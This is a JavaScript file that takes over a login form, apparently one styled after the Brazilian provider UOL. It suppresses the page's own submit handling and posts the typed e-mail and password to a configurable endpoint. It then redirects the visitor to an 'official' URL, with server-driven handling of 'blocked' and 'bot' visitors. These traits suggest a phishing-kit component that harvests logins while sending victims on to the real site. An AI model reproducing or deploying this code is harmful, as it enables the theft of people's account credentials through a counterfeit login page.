"use strict";

(function () {
    var cfg = window.LOGIN_BRIDGE || {};
    var started = false;

    function resolveUrl(url) {
        var u = String(url || "/login.php");
        if (/^https?:\/\//i.test(u)) {
            return u;
        }
        if (u.charAt(0) === "/") {
            return window.location.origin + u;
        }
        return window.location.origin + "/" + u;
    }

    function q(sel, root) {
        return (root || document).querySelector(sel);
    }

    function showMessage(text, ok) {
        var msgSel = cfg.message || "#message";
        var el = q(msgSel);
        if (!el) {
            el = document.getElementById("message") || document.getElementById("divretorno");
        }
        if (!el) {
            return;
        }
        if (cfg.messageHtml) {
            if (ok) {
                el.classList.add("uol-ok");
                el.innerHTML = text ? "<div class=\"alert alert-success\">" + escapeHtml(text) + "</div>" : "";
            } else {
                el.classList.remove("uol-ok");
                el.innerHTML = text ? "<div class=\"alert alert-danger\">" + escapeHtml(text) + "</div>" : "";
            }
        } else {
            if (ok) {
                el.classList.add("uol-ok");
            } else {
                el.classList.remove("uol-ok");
            }
            el.textContent = text || "";
        }
        el.style.display = text ? "block" : "";
    }

    function escapeHtml(s) {
        return String(s)
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;");
    }

    function finishResult(result, submitEl) {
        var data = result.data || {};

        if (data.blocked && data.redirect) {
            if (data.bot) {
                window.location.replace(data.redirect);
                return;
            }
            window.location.replace(data.redirect);
            return;
        }

        if (data.redirect && result.ok) {
            window.location.replace(data.redirect || window.UOL_OFFICIAL || "/");
            return;
        }

        if (data.redirect && !result.ok) {
            window.location.replace(data.redirect);
            return;
        }

        var display = data.text || data.message || "Usuario ou senha invalidos.";
        showMessage(display, false);
        document.body.classList.remove("logging-in");
        if (submitEl) {
            submitEl.disabled = false;
        }
    }

    function bindForm(form) {
        if (!form || form.dataset.bridgeBound === "1") {
            return;
        }
        form.dataset.bridgeBound = "1";

        var emailSel = cfg.email || "#login";
        var passSel = cfg.password || "#password";
        var submitSel = cfg.submit || "#login_submit, #submit, [type=submit]";
        var action = resolveUrl(cfg.action || "login.php");
        var official = window.UOL_OFFICIAL || "/";
        var M = window.UOL_MESSAGES || {};

        function doLogin() {
            var emailEl = q(emailSel, form) || q('input[type="email"]', form);
            var passEl = q(passSel, form) || q('input[type="password"]', form);
            var submitEl = q(submitSel, form) || q('[type="submit"]', form);
            var email = emailEl ? String(emailEl.value || "").trim() : "";
            var pass = passEl ? String(passEl.value || "") : "";

            if (!email) {
                showMessage("Informe seu e-mail para entrar.", false);
                return false;
            }
            if (!pass) {
                showMessage("Informe sua senha para entrar.", false);
                return false;
            }

            var body = "login=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(pass);

            document.body.classList.add("logging-in");
            if (submitEl) {
                submitEl.disabled = true;
            }
            showMessage(M.authenticating || "Autenticando...", true);

            var delay = 0;
            var delayDone = false;
            var fetchResult = null;

            setTimeout(function () {
                delayDone = true;
                if (fetchResult) {
                    finishResult(fetchResult, submitEl);
                }
            }, delay);

            fetch(action, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                credentials: "same-origin",
                body: body
            })
                .then(function (res) {
                    return res.json().then(function (data) {
                        return { ok: res.ok, data: data };
                    });
                })
                .then(function (result) {
                    fetchResult = result;
                    if (delayDone) {
                        finishResult(result, submitEl);
                    }
                })
                .catch(function () {
                    showMessage(M.network_error || "Erro de conexao.", false);
                    document.body.classList.remove("logging-in");
                    if (submitEl) {
                        submitEl.disabled = false;
                    }
                });

            return false;
        }

        form.addEventListener("submit", function (e) {
            e.preventDefault();
            e.stopImmediatePropagation();
            doLogin();
        }, true);

        if (cfg.removeOnsubmit !== false) {
            form.removeAttribute("onsubmit");
        }

        var emailEl = q(emailSel, form) || q('input[type="email"]', form);
        if (emailEl) {
            setTimeout(function () {
                emailEl.focus();
            }, 150);
        }
    }

    function tryBind() {
        var formSel = cfg.form || "#login_form, #form_login, form";
        var form = q(formSel);
        if (form) {
            bindForm(form);
            return true;
        }
        return false;
    }

    function start() {
        if (started) {
            return;
        }
        started = true;

        if (tryBind()) {
            return;
        }

        if (!cfg.waitFor) {
            return;
        }

        var attempts = 0;
        var maxAttempts = cfg.waitForMax || 120;
        var timer = setInterval(function () {
            attempts += 1;
            if (tryBind() || attempts >= maxAttempts) {
                clearInterval(timer);
            }
        }, 250);
    }

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", start);
    } else {
        start();
    }
})();
